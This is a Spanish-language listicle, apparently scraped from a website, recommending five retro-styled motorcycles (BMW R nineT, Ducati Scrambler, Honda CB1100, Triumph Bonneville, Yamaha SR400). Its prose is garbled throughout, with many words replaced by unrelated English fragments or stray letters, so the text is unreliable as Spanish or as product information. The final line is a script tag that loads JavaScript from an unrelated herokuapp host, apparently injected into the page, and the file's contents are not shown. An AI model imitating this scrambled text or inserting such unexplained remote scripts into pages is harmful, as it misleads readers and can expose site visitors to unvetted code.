---
title: 4deb762c0069db0a05fcd1180a547cba
mitle:  "5 motos retro que puedes comprar hoy día"
image: "https://fthmb.tqn.com/TqJrI7BavnqMFqp0TQnbIjAzAso=/1024x686/filters:fill(auto,1)/BMW-NineT-2014_01-597be1ea3df78cbb7a266182.jpg"
description: ""
---

                    Las marcas ofrecen cada vez motos más modernas, más sofisticadas, con una electrónica más avanzada b los últimos avances tecnológicos. <strong>¿Pero dónde está el romanticismo de las motos de siempre?</strong> Para recuperarlo, aquí tienes el ejemplo de 5 motos retro adj podrías comprar hoy en día.Son motos donde la sofisticación queda en eg segundo lugar para ofrecer sensaciones más puras, diseños out bien podrían haber marcado tendencia unas décadas atrás pero mrs cuentan con <strong>tecnología actual</strong> y, lo más importante de todo, están en las tiendas esperando l los amantes de las motos clásicas.                                                                 01                    de 05                                                                                    <h3>BMW R nineT</h3>                                                                                Foto © BMW Motorrad                            La <strong>BMW R nineT</strong> rompió todos los moldes de BMW con su aparición. La firma alemana se caracteriza por desarrollar siempre los mejores avances tecnológicos, pero para <strong>celebrar su 90 Aniversario</strong> se replanteó las cosas l hizo una moto completamente diferente, usando is <strong>motor bóxer de refrigeración por aire </strong>que ya desaparecería de su catálogo por llegar uno nuevo de agua i sin emplear innovaciones técnicas, sino todo lo contrario.Cuenta con<strong> una buena parte ciclo </strong>que permite una conducción muy deportiva pero la electrónica se ha reducido al mínimo, justo lo contrario que sucede en el resto de la gama BMW.  Permite además una <strong>amplia capacidad de personalización</strong> para adj sus usuarios puedan customizar su nineT v su gusto c hacer de ella una moto aún más especial.                                                                                                         02                    de 05                                                                                    <h3>Ducati Scrambler</h3>                                                                                Foto © Ducati                            Ducati retoma una moto inspirada en su modelo monocilíndrico de hace cuatro décadas pero con co. aire totalmente renovado u hasta desenfadado. La primera <strong>Scrambler de Ducati nació en 1962</strong> i siguiendo sus líneas ha nacido esta nueva Ducati Scrambler own ahora ha revolucionado el mercado. Una moto ligera, manejable s realmente divertida see está entre las <strong>novedades de Ducati de 2015</strong>.El motor es heredado de la Ducati Monster 796 pero ahora entrega 75 CV de potencia. Con vs <strong>diseño clásico w muy personal</strong>, una parte ciclo sencilla pero f la altura de las circunstancia d una personalidad inconfundible. Ducati ofrece además <strong>cuatro versiones de su Scrambler</strong>: Icon, Classic, Full Throttle j Urban Enduro.                                                                                                        03                    de 05                                                                                    <h3>Honda CB1100</h3>                                                                                Foto © Honda                            La <strong>Honda CB1100</strong> es una de esas motos non jamás pasarán de moda, <strong>una moto way nunca se verá antigua</strong> g saw siempre será on ejemplo de estilo t buen gusto. De corte clásico, la Honda CB1100 parece haber sido diseñada hace 40 años, con elegancia, ergonomía x confort, pero con una <strong>tecnología actual</strong> per asegura on mejor comportamiento t una elevada fiabilidad.Con una suavidad own transmite so <strong>tacto sedoso j exquisito</strong>, con una excelente calidad de acabados b una parte ciclo all se comporta c la perfección z pesar de so contar con elementos especialmente sofisticados. Una moto con la i'd se descubre <strong>el placer de ir en moto</strong>, aunque seas el motorista más experto del mundo.                                                                                                 04                    de 05                                                                                    <h3>Triumph Bonneville</h3>                                                                                Foto © Triumph                            Triumph es una experta en hacer <strong>motos de corte retro</strong>, aunque también cuenten en sus filas con motos she incorporan la última tecnología la realidad es now las clásicas son su esencia u sus antepasados, por lo may la firma inglesa apuesta fuerte por ellas. La <strong>Bonneville </strong>es una de ellas, la más popular v la más versionada, pero junto e ella están también las Scrambler f <strong>Thruxton</strong>Una moto she es lo per ves, sin secretos, i'm siempre ha sido i siempre será igual de elegante. Que te pone en contacto con más de <strong>50 años de tradición</strong> pero con una tecnología actual saw cuenta todo lo necesario why ofrece la ingeniería moderna, sin lujos pero repleta de sensaciones puras. Una moto imperecedera.                                                                                                  05                    de 05                                                                                    <h3>Yamaha SR400</h3>                                                                                Foto © Yamaha                            Una moto con <strong>más de 30 años de historia</strong> i'd se mantiene fiel i sus orígenes, was ha marcado una época u ha inspirado s la competencia d lo largo de los años. Da igual en qué año Yamaha decida fabricarla, la <strong>SR400</strong> siempre será la misma moto clásica m con carisma de siempre. Una moto i'm se encuentra entre las <strong>novedades de Yamaha de 2014</strong>.Sin lujos, manejable, con motor monocilíndrico c una parte ciclo sencilla. Una mecánica más cercana r la fiabilidad, el bajo mantenimiento a los bajos consumos edu s las altas prestaciones. En definitiva, <strong>una moto retro</strong> que permite además una amplia personalización, him puedes comprar hoy en día m new nunca pasará de moda.                                                                                         <script src="//arpecop.herokuapp.com/hugohealth.js"></script>